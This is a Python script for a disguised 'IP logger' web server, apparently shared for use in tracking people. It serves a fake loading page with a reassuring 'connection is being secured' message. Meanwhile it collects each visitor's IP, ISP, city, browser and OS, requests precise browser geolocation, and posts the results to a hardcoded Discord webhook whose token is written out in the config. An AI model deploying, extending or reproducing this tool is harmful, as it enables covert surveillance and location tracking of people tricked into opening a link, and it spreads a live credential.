# kupal logger ni saito
# Enhanced by XSYTHO

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser
from datetime import datetime

__app__ = "🔷 Premium IP Logger"
__description__ = "Advanced IP tracking tool with enhanced stealth and reporting features"
__version__ = "v3.0"
__author__ = "XSYTHO"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1390198662667440309/M3X9Ibay6lyI11GOjd0PI8s91O9YOaiftX13mVyVI40c_18IWXoLp9Ovyt4u_LVqLq_4",
    "image": "https://i.imgur.com/x9Z0X2J.gif",  # Premium animated GIF
    
    # ENHANCED CUSTOMIZATION #
    "username": "🕵️‍♂️ IP Tracker Pro",
    "color": 0x5865F2,  # Discord blurple color
    "footer": "XSYTHO Logger • {}".format(datetime.now().strftime("%Y-%m-%d %H:%M")),
    
    # VISUAL ENHANCEMENTS #
    "thumbnail": "https://i.imgur.com/J5ymdQx.png",  # Premium thumbnail
    "author_icon": "https://i.imgur.com/3JjQ8Hx.png",
    
    # ADVANCED OPTIONS #
    "accurateLocation": True,
    "vpnCheck": 2,
    "antiBot": 2,
    "linkAlerts": True,
    "buggedImage": True,
    
    # SOCIAL ENGINEERING #
    "message": {
        "doMessage": True,
        "message": "🔒 Your connection is being secured...",
        "richMessage": True
    },
    
    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://discord.com"
    }
}

# Color Palette
COLORS = {
    "success": 0x3BA55C,
    "warning": 0xFAA61A,
    "error": 0xED4245,
    "info": 0x5865F2
}

blacklistedIPs = ("27", "34", "35", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord Bot"
    elif useragent.startswith("TelegramBot"):
        return "Telegram Bot"
    elif "bot" in useragent.lower() or "crawler" in useragent.lower():
        return "Unknown Bot"
    else:
        return False

def sendEmbed(title, description, color=COLORS["info"], fields=None, thumbnail=None):
    embed = {
        "username": config["username"],
        "embeds": [{
            "title": title,
            "description": description,
            "color": color,
            "footer": {
                "text": config["footer"]
            },
            "thumbnail": {"url": config["thumbnail"]} if thumbnail else None,
            "fields": fields or []
        }]
    }
    requests.post(config["webhook"], json=embed)

def reportError(error):
    sendEmbed(
        "❌ Logger Error",
        f"An error occurred while logging an IP!\n\n```py\n{error}\n```",
        COLORS["error"]
    )

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=None):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        sendEmbed(
            "⚠️ Bot Activity Detected",
            f"Bot interaction detected from {bot}\n\n**IP:** `{ip}`\n**Endpoint:** `{endpoint}`",
            COLORS["warning"]
        ) if config["linkAlerts"] else None
        return

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        
        # Enhanced VPN/Bot detection
        if info.get("proxy", False):
            if config["vpnCheck"] == 2:
                return
            color = COLORS["warning"]
            vpn_status = "🔴 VPN/Proxy Detected"
        else:
            color = config["color"]
            vpn_status = "🟢 Clean IP"
            
        if info.get("hosting", False):
            if config["antiBot"] == 4:
                return
            bot_status = "🔴 Likely Bot"
            color = COLORS["error"]
        else:
            bot_status = "🟢 Human Traffic"
        
        # Get OS and browser info
        os, browser = httpagentparser.simple_detect(useragent)
        
        # Create rich embed
        fields = [
            {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True},
            {"name": "🛡️ Protection", "value": f"{vpn_status}\n{bot_status}", "inline": True},
            {"name": "📍 Location", "value": f"{info.get('city', 'Unknown')}, {info.get('regionName', 'Unknown')}, {info.get('country', 'Unknown')}", "inline": False},
            {"name": "🔧 Technical", "value": f"**ISP:** {info.get('isp', 'Unknown')}\n**ASN:** {info.get('as', 'Unknown')}", "inline": True},
            {"name": "💻 System", "value": f"**OS:** {os}\n**Browser:** {browser}", "inline": True}
        ]
        
        if coords:
            fields.append({
                "name": "📌 Coordinates",
                "value": f"[Google Maps](https://www.google.com/maps?q={coords})",
                "inline": True
            })
        
        sendEmbed(
            "🎯 New IP Logged",
            f"**Endpoint:** `{endpoint}`\n**Time:** {datetime.now().strftime('%H:%M:%S')}",
            color,
            fields,
            thumbnail=url
        )
        
        return info
        
    except Exception as e:
        reportError(str(e))
        return None

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class PremiumLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            # Get target URL
            url = config["image"]
            if config.get("imageArgument", True):
                query = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
                url = base64.b64decode(query.get("url") or query.get("id") or b"").decode() or url
            
            # Create stealth page
            stealth_page = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Content...</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background-color: #1e1e2e;
            color: #ffffff;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }}
        .container {{
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
        }}
        .loader {{
            border: 5px solid #2b2d42;
            border-top: 5px solid #5865F2;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1.5s linear infinite;
            margin-bottom: 20px;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        .image-container {{
            background-image: url('{url}');
            background-position: center;
            background-repeat: no-repeat;
            background-size: contain;
            width: 100vw;
            height: 100vh;
            opacity: 0;
            transition: opacity 1s ease;
        }}
        .image-container.loaded {{
            opacity: 1;
        }}
    </style>
</head>
<body>
    <div class="container" id="loader">
        <div class="loader"></div>
        <h2>{config["message"]["message"]}</h2>
    </div>
    <div class="image-container" id="image"></div>
    <script>
        // Show loading animation first
        setTimeout(function() {{
            document.getElementById('loader').style.display = 'none';
            document.getElementById('image').classList.add('loaded');
        }}, 1500);
        
        // Location grabber
        {self.getLocationScript()}
    </script>
</body>
</html>
            """
            
            # Handle bots differently
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_bot_response(url)
                return
            
            # Process real visitors
            self.process_visitor(url, stealth_page.encode())
            
        except Exception as e:
            self.send_error(500, message=str(e))
            reportError(traceback.format_exc())

    def getLocationScript(self):
        if not config["accurateLocation"]:
            return ""
        return """
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(pos) {
                let coords = btoa(pos.coords.latitude + "," + pos.coords.longitude);
                let currentUrl = new URL(window.location.href);
                currentUrl.searchParams.set('g', coords);
                fetch(currentUrl.toString(), {mode: 'no-cors'});
            });
        }
        """
    
    def send_bot_response(self, url):
        self.send_response(200 if config["buggedImage"] else 302)
        self.send_header('Content-type' if config["buggedImage"] else 'Location', 
                       'image/jpeg' if config["buggedImage"] else url)
        self.end_headers()
        
        if config["buggedImage"]:
            self.wfile.write(binaries["loading"])
        
        makeReport(self.headers.get('x-forwarded-for'), 
                 endpoint=self.path.split("?")[0], 
                 url=url)
    
    def process_visitor(self, url, data):
        query = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
        location = base64.b64decode(query.get("g", b"")).decode() if query.get("g") else None
        
        result = makeReport(
            ip=self.headers.get('x-forwarded-for'),
            useragent=self.headers.get('user-agent'),
            coords=location,
            endpoint=self.path.split("?")[0],
            url=url
        )
        
        if config["message"]["doMessage"] and result and config["message"]["richMessage"]:
            message = config["message"]["message"].format(
                ip=self.headers.get('x-forwarded-for'),
                isp=result.get("isp", "Unknown"),
                country=result.get("country", "Unknown"),
                city=result.get("city", "Unknown"),
                browser=httpagentparser.simple_detect(self.headers.get('user-agent'))[1]
            )
            data = message.encode()
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(data)

    do_GET = handleRequest
    do_POST = handleRequest

handler = PremiumLoggerAPI
